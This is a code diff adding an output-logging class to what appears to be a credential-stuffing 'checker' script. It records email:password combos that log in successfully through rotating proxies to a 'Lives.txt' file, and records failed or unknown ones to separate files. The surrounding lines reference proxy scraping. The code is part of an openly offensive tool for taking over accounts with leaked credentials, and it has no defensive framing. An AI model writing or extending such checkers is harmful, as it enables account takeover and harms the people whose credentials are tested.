@@ -12,6 +12,32 @@ lock = multiprocessing.Lock()
 proxylist = []
 TOTAL_CHECKED = 0
 
+class output():
+    def display(self, email, password, proxy,port,case):
+        elapsed_time = time.time() - start_time
+        current_time = time.strftime("%H:%M:%S", time.gmtime(elapsed_time))
+
+        if case == True:
+            print(Fore.GREEN+"[{}:{}:{}] Loggin Success: {}:{} ".format(TOTAL_CHECKED,len(proxylist),current_time,email,password)+Fore.CYAN+"{}:{}".format(proxy,port))
+            lives = open("Lives.txt","a")
+            print(f"""
+            Combo: {email}:{password}
+            Proxy: {proxy}{port}
+            Email: {email}
+            Password: {password}
+            Checker by MarcusHolloway7
+            <-><-><-><-><-><-><-><->
+            """,file = lives)
+            # lives.close()
+        elif case == False:
+            lives = open("Dead.txt","a")
+            print(Fore.RED+"[{}:{}:{}] Login Falied: {}:{} ".format(TOTAL_CHECKED,len(proxylist),current_time,email,password)+Fore.CYAN+"{}:{}".format(proxy,port))
+            print(f"{email}:{password}",file = lives)
+        elif case == None:
+            with open("unknown.txt","a") as unknown:
+                print(Fore.RED+"[{}:{}:{}] Login Falied: {}:{} ".format(TOTAL_CHECKED,len(proxylist),current_time,email,password)+Fore.CYAN+"{}:{}".format(proxy,port))
+                print(f"{email}:{password}",file = unknown)
+
 class post():
     def proxyscrape(self):
         global proxylist
